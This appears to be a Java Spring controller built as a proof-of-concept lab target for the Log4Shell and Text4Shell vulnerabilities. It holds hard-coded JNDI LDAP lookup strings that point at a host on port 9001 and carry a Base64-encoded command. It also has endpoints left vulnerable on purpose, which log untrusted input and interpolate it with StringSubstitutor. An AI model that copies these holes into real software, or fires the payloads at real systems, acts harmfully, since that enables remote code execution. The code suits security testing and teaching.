package tech.cybersword.poc.log4jtext4shell;

import java.util.Base64;
import java.util.Date;

import org.apache.commons.text.StringSubstitutor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class DemoRESTController {

	private static final Logger logger = LogManager.getLogger(DemoRESTController.class);

	@GetMapping("/log4jTest")
	public String log4j() {
		String str = System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase");

		if (logger.isInfoEnabled()) {
			logger.info(String.format("RCE possible %s", str));
		}

		Runnable runnable = new Runnable() {
			@Override
			public void run() {
				String message = "${jndi:ldap://192.168.178.37:9001/a}";
				if (logger.isInfoEnabled()) {
					logger.info(String.format("try %s", message));
				}
				logger.info(message);
			}
		};

		Runnable runnable2 = new Runnable() {
			@Override
			public void run() {
				String message2 = "${jndi:ldap://192.168.178.37:9001/Basic/Command/Base64/dG91Y2ggdHR0Cg==}";
				if (logger.isInfoEnabled()) {
					logger.info(String.format("try2 %s", message2));
				}
				logger.info(message2);

			}
		};

		Runnable runnable3 = new Runnable() {
			@Override
			public void run() {
				String message3 = "User-Agent: ${jndi:ldap://192.168.178.37:9001/Basic/Command/Base64/dG91Y2ggdHR0Cg==}";
				if (logger.isInfoEnabled()) {
					logger.info(String.format("try3 %s", message3));
				}
				logger.info(message3);
			}
		};

		Thread thread = new Thread(runnable);
		Thread thread2 = new Thread(runnable2);
		Thread thread3 = new Thread(runnable3);

		thread.start();
		thread2.start();
		thread3.start();

		return "log4j test " + new Date();
	}

	@GetMapping("/log4j")
	public String log4j(@RequestHeader("Header-Attribute") String header) {
		if (logger.isInfoEnabled()) {
			logger.info(String.format("log4j %s", new Date().toString()));
		}
		if (logger.isInfoEnabled()) {
			logger.info(String.format("log4j over http header %s", header));
		}
		return "log4j " + new Date();
	}

	@GetMapping("/log4j/{payload}")
	public String log4j2(@PathVariable String payload) {
		if (logger.isInfoEnabled()) {
			logger.info(String.format("log4j %s", new Date().toString()));
		}
		if (logger.isInfoEnabled()) {
			logger.info(String.format("log4j over http path variable %s", payload));
		}
		return "log4j2 " + new Date();
	}

	@GetMapping("/text4Shell/{payload}")
	public String text4Shell(@PathVariable String payload) {
		if (logger.isInfoEnabled()) {
			logger.info(String.format("incomming payload %s", payload));
		}

		String encPayload = new String(Base64.getDecoder().decode(payload));

		if (logger.isInfoEnabled()) {
			logger.info(String.format("encoded payload %s", encPayload));
		}

		StringSubstitutor stringSubstitutor = StringSubstitutor.createInterpolator();
		String result = stringSubstitutor.replace(encPayload);

		if (logger.isInfoEnabled()) {
			logger.info(result);
		}
		return "text4Shell " + result + new Date();
	}

	@GetMapping("/text4Shell2/{payload}")
	public String text4Shell2(@PathVariable String payload) {
		if (logger.isInfoEnabled()) {
			logger.info(String.format("incomming payload %s", payload));
		}

		StringSubstitutor stringSubstitutor = StringSubstitutor.createInterpolator();
		String result = stringSubstitutor.replace(payload);

		if (logger.isInfoEnabled()) {
			logger.info(result);
		}
		return "text4Shell " + result + new Date();
	}
}